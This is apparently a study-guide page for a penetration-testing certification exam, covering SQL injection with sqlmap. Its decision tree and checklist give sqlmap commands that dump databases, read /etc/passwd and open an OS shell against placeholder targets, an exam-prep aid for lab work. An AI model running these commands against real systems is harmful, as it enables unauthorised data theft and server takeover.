# 13 — SQL Injection

> Almost always solved with **sqlmap**. The exam usually gives you a vulnerable URL or login form and asks for a table name, column, or a specific row value. Learn the sqlmap flow cold.

## 🧭 Decision tree — "I see a SQLi question"

```
Found an injectable parameter?
│
├── GET parameter (e.g. ?id=1)
│   └── sqlmap -u "http://<IP>/page.php?id=1" --batch
│
├── POST parameter (login form / search)
│   ├── Capture the request in Burp → save as req.txt
│   └── sqlmap -r req.txt --batch
│
├── Authenticated area (needs session cookie)
│   └── sqlmap -u "<URL>" --cookie="PHPSESSID=<ID>" --batch
│
└── Step-by-step extraction ladder
    ├── 1. Confirm vuln             → sqlmap -u <URL> --batch
    ├── 2. List databases           → --dbs
    ├── 3. List tables in DB        → -D <db> --tables
    ├── 4. List columns in table    → -D <db> -T <table> --columns
    ├── 5. Dump data                → -D <db> -T <table> --dump
    ├── 6. Dump everything          → --dump-all
    ├── 7. Read OS file             → --file-read=/etc/passwd
    └── 8. Get OS shell             → --os-shell
```

## 📄 Files in this folder

- **[commands.md](commands.md)** — the sqlmap cheat sheet
- **[walkthroughs.md](walkthroughs.md)** — full end-to-end dumps
- Question bank: **[../questions/by-domain/13-sqli.md](../questions/by-domain/13-sqli.md)**

## 🛠 Tools used in this domain

- **[sqlmap](../tools/sqlmap.md)** ← the only one that matters
- **[burpsuite](../tools/burpsuite.md)** — to capture POST requests

## ✅ Domain checklist

- [ ] Run sqlmap against a GET param with `--batch` from memory
- [ ] Capture a POST login in Burp → save to `req.txt` → feed to sqlmap with `-r`
- [ ] Know the `--dbs → --tables → --columns → --dump` ladder
- [ ] Know how to pass a cookie with `--cookie`
- [ ] Know `--level` and `--risk` (bump them if nothing found)
- [ ] Know `--os-shell` exists and when it works (MySQL + FILE privilege)
- [ ] Done all questions in [the question bank](../questions/by-domain/13-sqli.md)
